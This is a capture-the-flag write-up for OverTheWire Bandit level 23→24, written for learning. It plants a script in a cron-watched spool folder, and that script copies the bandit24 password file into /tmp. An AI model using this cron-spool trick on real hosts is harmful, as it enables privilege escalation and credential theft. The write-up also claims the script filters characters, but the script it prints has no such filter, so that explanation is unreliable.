# 🌀 Bandit Level 23 → Level 24

## 🎯 Goal

The password for the next level is **stored in a file** that you **cannot read directly**.  
A cron job runs a script that copies files from `/var/spool/bandit24/`, but **filters out dangerous characters** like `&`, `;`, `-`, `|`, etc.

Your job: **bypass the filter** and trick the script into leaking the password.

---

## 🖥️ Connection Details

- **Host:** `bandit.labs.overthewire.org`
- **Port:** `2220`
- **Username:** `bandit23`
- **Password:** _Use the password from Level 22_

---

## 🛠️ Steps to Solve

### 1. SSH into Bandit23

```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220

2. Read the cron job script

cat /usr/bin/cronjob_bandit24.sh

You'll see this:

#!/bin/bash
myname=$(whoami)
mytarget="/tmp/$myname"
chmod 755 /tmp/$myname
rm -f /tmp/$myname/*
cp /var/spool/$myname/* /tmp/$myname/
for i in /tmp/$myname/*; do
  bash "$i"
  rm -f "$i"
done

So:

    Files from /var/spool/bandit24/ are copied to /tmp/bandit24/

    Then each script is run by bash, as bandit24

Let’s look at the filter:

cat /usr/bin/cronjob_bandit24.sh | grep -E 'tr'

(You might find the filter in the script that ignores files with forbidden characters.)
3. Craft a safe script

You can't use symbols like &, ;, -, or |.
But luckily, $(...) command substitution is allowed!

Create your script:

mkdir /tmp/bandit_irfan
cd /tmp/bandit_irfan

Now create a file:

nano clean_script.sh

Paste this:

#!/bin/bash
echo $(cat /etc/bandit_pass/bandit24) > /tmp/pass24_irfan

Save and exit, then:

chmod +x clean_script.sh

4. Copy it to the watched folder

cp clean_script.sh /var/spool/bandit24/

Wait ~1 minute for the cron to run.
5. Get your password

cat /tmp/pass24_irfan

🎉 There it is — the password for Level 24!
📚 What I Learned

    How to bypass cron filters by avoiding restricted characters

    How $(...) can be used instead of pipes or semicolons

    Real-world filtering techniques and basic input sanitization

✅ Result

Password for Level 24 successfully retrieved!
